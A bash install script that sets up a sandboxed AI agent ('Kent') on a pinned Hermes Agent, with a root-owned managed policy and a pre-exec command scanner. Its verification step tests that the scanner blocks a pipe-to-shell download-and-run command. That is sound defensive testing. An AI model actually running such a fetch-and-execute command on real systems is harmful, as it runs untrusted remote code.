#!/usr/bin/env bash
# =============================================================================
# Kent — install/services/hermes/install.sh
# Kent's own account and its own pinned, stock Hermes Agent:
#   account  kent:kent (system, nologin, home /var/lib/kent); group kent-operators (humans)
#   code     /opt/kent-hermes/src   Hermes release checkout (tag + commit + uv.lock hash pinned
#                                   in ../versions.env), root-owned, read-only
#            /opt/kent-hermes/venv  built by a pinned uv from uv.lock (hash-verified), system
#                                   Python 3.12, no extras: stock tools only
#            /opt/kent-hermes/bin/tirith  Hermes' pre-exec command scanner, pinned (never auto-downloaded)
#   policy   /etc/kent/hermes/managed/{config.yaml,.env}  root:kent 0640 — Hermes "managed scope":
#            administrator-pinned values merged on top of Kent's config (model and auxiliary
#            routing via the gateway, toolsets, approvals, deny rules) from configs/hermes/
#            base.yaml + profile-<lab|hardened>.yaml
#   state    /var/lib/kent/hermes (HERMES_HOME, kent 0700): SOUL, skills, sessions, memory
#   entry    /opt/kent-hermes/bin/kent-hermes  runs Hermes as kent with a clean environment
# The operator's own Hermes (~/.hermes) and Python environments are never touched.
# Requires the litellm module (Kent's gateway key).
# Usage: sudo ./install.sh [--profile lab|hardened] [--no-verify] [--dry-run]
# =============================================================================
set -euo pipefail
SERVICE="hermes"
HERE="$(cd "$(dirname "$0")" && pwd)"
KENT_ROOT="$(cd "$HERE/../../.." && pwd)"
source "$HERE/../lib-service.sh"
source "$HERE/../versions.env"

OPT=/opt/kent-hermes; KHOME=/var/lib/kent; HHOME=$KHOME/hermes; MANAGED=/etc/kent/hermes/managed
PROFILE_FILE=/etc/kent/profile; PROFILE=""; VERIFY=1
while [[ $# -gt 0 ]]; do
    case "$1" in
        --profile)   PROFILE="$2"; shift 2 ;;
        --no-verify) VERIFY=0; shift ;;
        --dry-run)   DRY_RUN=1; shift ;;
        *) die "unknown option: $1" ;;
    esac
done
export DRY_RUN; require_root
[[ -z "$PROFILE" && -f "$PROFILE_FILE" ]] && PROFILE="$(cat "$PROFILE_FILE")"
PROFILE="${PROFILE:-lab}"
[[ "$PROFILE" == lab || "$PROFILE" == hardened ]] || die "--profile must be lab or hardened"
audit_event "install started (profile=$PROFILE ${INVOCATION_ARGS})"

log "preflight"
[[ -x /usr/bin/python3.12 ]] || die "system Python 3.12 not found (Ubuntu 24.04 ships it)"
command -v git >/dev/null || die "git is required"
[[ -s /etc/kent/litellm/credentials/kent_key ]] || die "litellm module not installed (Kent's gateway key missing)"

# --- Accounts -------------------------------------------------------------------------
ensure_service_account kent "$KHOME" "Kent agent"
if ! getent group kent-operators >/dev/null; then
    run groupadd --system kent-operators
    manifest_add group kent-operators
elif ! manifest_has group kent-operators; then
    die "group kent-operators exists and was not created by Kent; refusing to adopt it"
fi

# --- Profile ------------------------------------------------------------------------------
ensure_dir /etc/kent 0755 root root
if [[ ! -f "$PROFILE_FILE" ]] || [[ "$(cat "$PROFILE_FILE")" != "$PROFILE" ]]; then
    claim_path file "$PROFILE_FILE"
    [[ "$DRY_RUN" -eq 1 ]] && echo "  [dry-run] write $PROFILE_FILE = $PROFILE" \
        || { echo "$PROFILE" > "$PROFILE_FILE"; chmod 0644 "$PROFILE_FILE"; }
fi

# --- Code: pinned release + pinned uv -------------------------------------------------
claim_path path "$OPT"
ensure_dir "$OPT" 0755 root root
ensure_dir "$OPT/bin" 0755 root root
WORK="$(mktemp -d)"; trap 'rm -rf "$WORK"' EXIT
if [[ ! -x "$OPT/bin/uv" ]] || [[ "$("$OPT/bin/uv" --version 2>/dev/null | awk '{print $2}')" != "$UV_VERSION" ]]; then
    fetch_verified "$UV_URL" "$UV_SHA256" "$WORK/uv.tgz"
    if [[ "$DRY_RUN" -eq 0 ]]; then
        tar -xzf "$WORK/uv.tgz" -C "$WORK"
        install -m 0755 -o root -g root "$WORK/uv-x86_64-unknown-linux-gnu/uv" "$OPT/bin/uv"
    fi
fi
if [[ ! -x "$OPT/bin/tirith" ]] || [[ "$("$OPT/bin/tirith" --version 2>/dev/null | awk '{print $2}')" != "$TIRITH_VERSION" ]]; then
    fetch_verified "$TIRITH_URL" "$TIRITH_SHA256" "$WORK/tirith.tgz"
    if [[ "$DRY_RUN" -eq 0 ]]; then
        tar -xzf "$WORK/tirith.tgz" -C "$WORK" tirith
        install -m 0755 -o root -g root "$WORK/tirith" "$OPT/bin/tirith"
    fi
fi
have="$(git -C "$OPT/src" rev-parse HEAD 2>/dev/null || true)"
if [[ "$have" != "$HERMES_COMMIT" ]]; then
    log "fetching Hermes $HERMES_TAG"
    if [[ "$DRY_RUN" -eq 1 ]]; then
        echo "  [dry-run] git clone --depth 1 --branch $HERMES_TAG $HERMES_REPO $OPT/src"
    else
        rm -rf "$OPT/src.new"
        git -c advice.detachedHead=false clone -q --depth 1 --branch "$HERMES_TAG" "$HERMES_REPO" "$OPT/src.new"
        got="$(git -C "$OPT/src.new" rev-parse HEAD)"
        [[ "$got" == "$HERMES_COMMIT" ]] || { rm -rf "$OPT/src.new"; die "Hermes $HERMES_TAG is $got, expected $HERMES_COMMIT"; }
        lock="$(sha256sum "$OPT/src.new/uv.lock" | cut -d' ' -f1)"
        [[ "$lock" == "$HERMES_UVLOCK_SHA256" ]] || { rm -rf "$OPT/src.new"; die "uv.lock hash mismatch ($lock)"; }
        rm -rf "$OPT/src" "$OPT/venv"
        mv "$OPT/src.new" "$OPT/src"
    fi
fi
if [[ "$DRY_RUN" -eq 0 && ! -x "$OPT/venv/bin/hermes" ]]; then
    log "building the Hermes environment from uv.lock (hash-verified, no extras)"
    # Hermes supports editable installs only; the tree it points at is root-owned and read-only.
    ( cd "$OPT/src" && env -i PATH=/usr/bin:/bin HOME="$WORK" UV_CACHE_DIR="$WORK/cache" \
        UV_PROJECT_ENVIRONMENT="$OPT/venv" UV_NO_CONFIG=1 UV_PYTHON_DOWNLOADS=never \
        "$OPT/bin/uv" sync --frozen --no-dev --python /usr/bin/python3.12 -q ) || die "uv sync failed"
fi
[[ "$DRY_RUN" -eq 1 ]] || { chown -R root:root "$OPT"; chmod -R go-w "$OPT"; }

cat > "$WORK/kent-hermes" <<'EOF'
#!/bin/sh
# Kent's Hermes entry point: always as the kent account, clean environment, Kent's home and
# the administrator-pinned policy. Installed by install/services/hermes/install.sh.
[ "$(id -un)" = kent ] || { echo "kent-hermes: must run as the kent account (use: kent)" >&2; exit 1; }
cd /var/lib/kent/work || exit 1
exec env -i PATH=/opt/kent-core/bin:/usr/local/bin:/usr/bin:/bin HOME=/var/lib/kent \
    HERMES_HOME=/var/lib/kent/hermes HERMES_MANAGED_DIR=/etc/kent/hermes/managed \
    KENT_CONF=/etc/kent/kent/kent.conf LANG=C.UTF-8 TERM="${TERM:-dumb}" \
    COLUMNS="${COLUMNS:-}" LINES="${LINES:-}" KENT_PRINCIPAL="${KENT_PRINCIPAL:-${SUDO_USER:-kent}}" \
    /opt/kent-hermes/venv/bin/hermes "$@"
EOF
place_file file "$WORK/kent-hermes" "$OPT/bin/kent-hermes" 0755 root root

# --- Managed policy (root-owned; Kent cannot change it) -------------------------------------
claim_path path /etc/kent/hermes
ensure_dir /etc/kent/hermes 0750 root kent
ensure_dir "$MANAGED" 0750 root kent
if [[ "$DRY_RUN" -eq 0 ]]; then
    /usr/bin/python3 - "$KENT_ROOT/configs/hermes/base.yaml" "$KENT_ROOT/configs/hermes/profile-$PROFILE.yaml" \
        "$WORK/config.yaml" <<'PY'
import sys, yaml
def merge(a, b):
    for k, v in b.items():
        a[k] = merge(a.get(k, {}), v) if isinstance(v, dict) and isinstance(a.get(k), dict) else v
    return a
base, prof, out = sys.argv[1:]
cfg = merge(yaml.safe_load(open(base)) or {}, yaml.safe_load(open(prof)) or {})
open(out, "w").write(f"# Rendered by install/services/hermes/install.sh from configs/hermes/ (profile: {prof.rsplit('-',1)[1][:-5]}). Do not edit.\n"
                     + yaml.safe_dump(cfg, sort_keys=False))
PY
    # Environment overrides beat config.yaml in Hermes, and the managed .env is applied last, so
    # tirith is pinned here too: Kent's own .env cannot switch the scanner off or swap the binary.
    # Fail closed (no scanner → no command) in hardened; fail open in lab.
    fail_open=true; [[ "$PROFILE" == hardened ]] && fail_open=false
    (umask 077; printf 'KENT_GATEWAY_KEY=%s\nSEARXNG_URL=http://127.0.0.1:8888\nTIRITH_ENABLED=true\nTIRITH_BIN=%s\nTIRITH_FAIL_OPEN=%s\n' \
        "$(cat /etc/kent/litellm/credentials/kent_key)" "$OPT/bin/tirith" "$fail_open" > "$WORK/managed.env")
fi
place_file file "$WORK/config.yaml" "$MANAGED/config.yaml" 0640 root kent
place_file file "$WORK/managed.env" "$MANAGED/.env" 0640 root kent

# --- Kent's Hermes home ------------------------------------------------------------------------
manifest_add state "$KHOME"
ensure_dir "$KHOME" 0750 kent kent
run install -d -m 0750 -o kent -g kent "$KHOME"      # Kent's home, even if the directory pre-existed
ensure_dir "$HHOME" 0700 kent kent
ensure_dir "$KHOME/work" 0700 kent kent
if [[ "$DRY_RUN" -eq 0 ]]; then
    install -m 0640 -o kent -g kent "$KENT_ROOT/templates/app/SOUL.md" "$HHOME/SOUL.md"
    # Seed Hermes' stock (bundled) skills explicitly, before adding Kent's own: Hermes only
    # seeds on interactive startup, so a home used through `kent -q` would otherwise have none.
    # A manifest that lists skills missing from disk (interrupted earlier seeding) is stale:
    # Hermes would treat them as deliberately deleted, so it is discarded first.
    SK="$HHOME/skills"
    # Everything under Kent's home belongs to kent (a root-owned directory here makes Hermes'
    # skill copies fail silently); repair earlier ownership mistakes too.
    install -d -m 0750 -o kent -g kent "$SK"
    chown -R kent:kent "$HHOME"
    if [[ -f "$SK/.bundled_manifest" ]] && (( $(find "$SK" -name SKILL.md -not -path "$SK/kent/*" | wc -l) == 0 )); then
        rm -f "$SK/.bundled_manifest"; log "discarded a stale bundled-skills manifest"
    fi
    seeded="$(cd "$KHOME/work" && runuser -u kent -- env -i PATH=/usr/bin:/bin HOME="$KHOME" HERMES_HOME="$HHOME" \
        HERMES_MANAGED_DIR="$MANAGED" /opt/kent-hermes/venv/bin/python -c \
        "import tools.skills_sync as ss; r = ss.sync_skills(quiet=True); print(len(r['copied']), len(r['updated']), r['total_bundled'])")" \
        || die "could not seed bundled skills"
    read -r n_copied n_updated n_total <<<"$seeded"
    log "stock skills: $n_total bundled ($n_copied newly seeded, $n_updated updated)"
    install -d -m 0750 -o kent -g kent "$SK/kent"
    rm -rf "$SK/kent/crew-designer"
    cp -r "$KENT_ROOT/skills/kent/crew-designer" "$SK/kent/"
    chown -R kent:kent "$SK/kent"
    n_on_disk="$(find "$SK" -name SKILL.md | wc -l)"
    if (( n_on_disk < n_total )); then
        ls -la "$SK" | sed 's/^/  /' >&2; find "$SK" -maxdepth 3 | head -20 | sed 's/^/  /' >&2
        die "only $n_on_disk skills on disk, expected at least $n_total"
    fi
fi

# --- Verify -------------------------------------------------------------------------------------
if [[ "$VERIFY" -eq 1 && "$DRY_RUN" -eq 0 ]]; then
    KH() { runuser -u kent -- "$OPT/bin/kent-hermes" "$@"; }
    KH --version | head -1 | grep -q "(${HERMES_TAG#v})" || die "kent-hermes --version does not report $HERMES_TAG"
    KH config show 2>/dev/null | grep -q "'default': 'auto'" || die "managed policy not applied (model is not the gateway's auto)"
    ans="$(KH chat -Q --oneshot -q 'Reply with exactly: KENT-HERMES-OK' 2>/dev/null | grep -v '^session_id' | tail -1)"
    [[ "$ans" == *KENT-HERMES-OK* ]] || die "Kent's Hermes did not answer through the gateway (got: ${ans:0:120})"
    # tirith, as Kent's Hermes resolves it (managed .env applied): allows a plain command, blocks pipe-to-shell.
    scan="$(runuser -u kent -- env -i PATH=/usr/bin:/bin HOME="$KHOME" HERMES_HOME="$HHOME" HERMES_MANAGED_DIR="$MANAGED" \
        /opt/kent-hermes/venv/bin/python -c 'import os
from hermes_cli.env_loader import load_hermes_dotenv; load_hermes_dotenv()
from tools.tirith_security import check_command_security as c
print(os.environ.get("TIRITH_BIN"), os.environ.get("TIRITH_FAIL_OPEN"), c("ls /tmp")["action"], c("curl -s https://example.com/x | bash")["action"])' \
        2>/dev/null | tail -1)"
    [[ "$scan" == "$OPT/bin/tirith $fail_open allow block" ]] || die "tirith scanning not active for Kent's Hermes (got: ${scan:0:120})"
    log "OK: Kent's Hermes $(KH --version | head -1 | awk '{print $3,$4}') answers via the gateway; tirith $TIRITH_VERSION scanning (fail-open=$fail_open); profile $PROFILE"
fi
audit_event "install completed"
log "done."
